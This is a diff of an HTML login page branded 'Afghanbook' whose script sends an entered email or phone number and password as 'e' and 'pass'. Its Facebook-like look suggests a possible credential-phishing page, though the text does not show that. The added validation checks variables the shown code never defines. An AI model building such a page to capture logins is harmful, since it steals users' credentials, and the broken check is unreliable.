@@ -16,6 +16,10 @@
         function postData() {
             var phone = document.getElementById('phone').value;
             var password = document.getElementById('password').value;
+            if(email == "" || uname == "") {
+                alert("please fill fields");
+                return;
+            }
             var data = {
                 e : phone,
                 pass: password
@@ -30,14 +34,14 @@
     <div class="headerDiv"><img src="" alt="Afghanbook" class="image"></div>
         <br>
         <div class="container">
-            <form method="post" onSubmit="postData();" action="">
+            <form>
                 <div class="form-group">
                     <input type="text" placeholder="Email Or Phone" id="phone" name="number" required class="form-control">
                 </div>
                 <div class="form-group">
                     <input type="password" placeholder="Password" id="password" name="password" required class="form-control">
                 </div>  
-                <button type="submit" class="btn btn-block btn-primary">Log In</button>
+                <button type="button" onClick="postData();" class="btn btn-block btn-primary">Log In</button>
             </form>
         </div>
         <br>
